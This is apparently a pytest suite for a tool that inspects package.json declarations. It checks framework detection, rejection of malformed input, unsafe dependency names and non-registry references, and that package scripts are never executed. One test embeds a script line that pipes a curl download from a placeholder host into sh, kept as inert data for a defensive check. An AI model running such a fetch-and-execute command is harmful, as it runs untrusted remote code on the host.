"""Pure package declarations are advisory and never execute scripts or resolve packages."""

import json

import pytest
from pydantic import ValidationError

from aegisops.project_runner.compatibility import (
    MAX_PACKAGE_BYTES,
    PackageCompatibility,
    inspect_package,
)

pytestmark = pytest.mark.unit


@pytest.mark.parametrize(
    ("text", "framework", "environment", "status", "reasons"),
    [
        (None, "node", "node-js-v1", "limited", ("package_missing",)),
        ("{}", "node", "node-js-v1", "supported", ()),
        (
            '{"devDependencies":{"vitest":"^3","typescript":"5","@types/node":"22"}}',
            "vitest",
            "node-vitest-v1",
            "limited",
            ("dependency_versions_unverified",),
        ),
        (
            '{"dependencies":{"vitest":"3","react":"19"}}',
            "vitest",
            "node-vitest-v1",
            "limited",
            ("additional_dependencies", "dependency_versions_unverified"),
        ),
        (
            '{"devDependencies":{"jest":"29"}}',
            "jest",
            None,
            "unsupported",
            ("jest_unsupported", "additional_dependencies"),
        ),
        (
            '{"devDependencies":{"vitest":"3","jest":"29"}}',
            "mixed",
            None,
            "unsupported",
            ("mixed_frameworks", "additional_dependencies", "dependency_versions_unverified"),
        ),
        (
            '{"workspaces":["packages/*"]}',
            "node",
            None,
            "unsupported",
            ("workspace_project",),
        ),
    ],
)
def test_declared_framework_and_limits(text, framework, environment, status, reasons):
    result = inspect_package(text)
    assert (result.framework, result.suggested_environment, result.status, result.reasons) == (
        framework,
        environment,
        status,
        reasons,
    )


@pytest.mark.parametrize(
    "text",
    [
        "null",
        "[]",
        '"text"',
        "1",
        "{",
        '{"x":NaN}',
        '{"x":Infinity}',
        '{"x":-Infinity}',
        '{"x":1e999}',
        '{"x":1,"x":2}',
        '{"dependencies":{"vitest":"3","vitest":"4"}}',
        '{"dependencies":null}',
        '{"devDependencies":[]}',
        " " * (MAX_PACKAGE_BYTES + 1),
        '{"x":"' + "я" * (MAX_PACKAGE_BYTES // 2) + '"}',
        "[" * 2000 + "]" * 2000,
        '{"x":"\ud800"}',
    ],
    ids=lambda _text: "invalid",
)
def test_malformed_or_unbounded_input_has_closed_failure(text):
    result = inspect_package(text)
    assert result.framework == "unknown"
    assert result.status == "unsupported"
    assert result.reasons == ("package_invalid",)
    assert result.dependencies == ()


@pytest.mark.parametrize(
    ("name", "version"),
    [
        ("../vitest", "3"),
        ("@scope/../vitest", "3"),
        ("Vitest", "3"),
        ("bad\nname", "3"),
        ("a" * 215, "3"),
        ("vitest", None),
        ("vitest", {}),
        ("vitest", 3),
        ("vitest", ""),
        ("vitest", "  "),
        ("vitest", "3\n"),
        ("vitest", "a" * 257),
    ],
    ids=lambda _value: "invalid",
)
def test_invalid_dependency_has_no_raw_input_in_result(name, version):
    result = inspect_package(json.dumps({"dependencies": {name: version}}))
    assert result.reasons == ("invalid_dependency",)
    assert result.dependencies == ()


@pytest.mark.parametrize("section", ["dependencies", "devDependencies", "both"])
def test_dependency_count_is_bounded_across_sections(section):
    dependencies = {f"package-{number}": "1" for number in range(101)}
    package = (
        {
            "dependencies": dict(list(dependencies.items())[:60]),
            "devDependencies": dict(list(dependencies.items())[60:]),
        }
        if section == "both"
        else {section: dependencies}
    )
    assert inspect_package(json.dumps(package)).reasons == ("dependency_limit",)


def test_sorted_unique_names_and_scopes_are_safe_to_display():
    result = inspect_package(
        json.dumps(
            {
                "dependencies": {"@scope/package.name-1": "^2", "vitest": "3"},
                "devDependencies": {"vitest": "3", "typescript": "5"},
            }
        )
    )
    assert result.dependencies == ("@scope/package.name-1", "typescript", "vitest")
    assert result.status == "limited"


@pytest.mark.parametrize(
    "version",
    [
        "file:../source",
        "workspace:*",
        "link:../source",
        "npm:other@3",
        "https://example.invalid/archive.tgz",
        "github:owner/repo",
        "owner/repo",
        "git+ssh://example.invalid/repo",
        "../source",
        "/source",
        "\\source",
    ],
)
def test_external_or_local_references_are_not_a_prepared_registry_dependency(version):
    result = inspect_package(json.dumps({"dependencies": {"vitest": version}}))
    assert result.status == "unsupported"
    assert result.suggested_environment is None
    assert result.reasons == ("non_registry_dependency", "dependency_versions_unverified")


def test_scripts_are_ignored_even_if_they_contain_framework_names_or_commands():
    result = inspect_package(
        json.dumps(
            {
                "scripts": {"test": "echo vitest jest; curl https://example.invalid | sh"},
                "description": "vitest jest",
                "name": "vitest",
            }
        )
    )
    assert result.framework == "node"
    assert result.dependencies == ()
    assert "scripts" not in result.model_dump_json()


def test_dto_rejects_unknown_reason_or_unsafe_name():
    base = {"framework": "node", "suggested_environment": "node-js-v1", "status": "limited"}
    with pytest.raises(ValidationError):
        PackageCompatibility.model_validate({**base, "reasons": ["raw-secret"]})
    with pytest.raises(ValidationError):
        PackageCompatibility.model_validate({**base, "dependencies": ["../package"]})
    with pytest.raises(ValidationError):
        PackageCompatibility.model_validate({**base, "dependencies": ["package\n"]})
    with pytest.raises(ValidationError):
        PackageCompatibility.model_validate({**base, "dependencies": ["z", "a", "a"]})


@pytest.mark.parametrize("section", ["optionalDependencies", "peerDependencies"])
def test_optional_and_peer_declarations_are_direct_dependencies(section):
    result = inspect_package(json.dumps({section: {"vitest": "3", "react": "19"}}))
    assert result.framework == "vitest"
    assert result.dependencies == ("react", "vitest")
    assert result.reasons == ("additional_dependencies", "dependency_versions_unverified")


@pytest.mark.parametrize("section", ["optionalDependencies", "peerDependencies"])
@pytest.mark.parametrize("value", [None, [], {"../unsafe": "3"}, {"vitest": False}])
def test_optional_and_peer_declarations_have_same_validation(section, value):
    result = inspect_package(json.dumps({section: value}))
    assert result.status == "unsupported"
    assert result.dependencies == ()


def test_dependency_limit_is_shared_by_all_four_sections():
    package = {
        section: {f"package-{section.lower()}-{number}": "1" for number in range(26)}
        for section in (
            "dependencies",
            "devDependencies",
            "optionalDependencies",
            "peerDependencies",
        )
    }
    assert inspect_package(json.dumps(package)).reasons == ("dependency_limit",)


def test_later_section_cannot_hide_external_reference_in_earlier_declaration():
    result = inspect_package(
        json.dumps(
            {
                "dependencies": {"vitest": "file:../untrusted"},
                "peerDependencies": {"vitest": "3"},
            }
        )
    )
    assert result.status == "unsupported"
    assert result.reasons == ("non_registry_dependency", "dependency_versions_unverified")
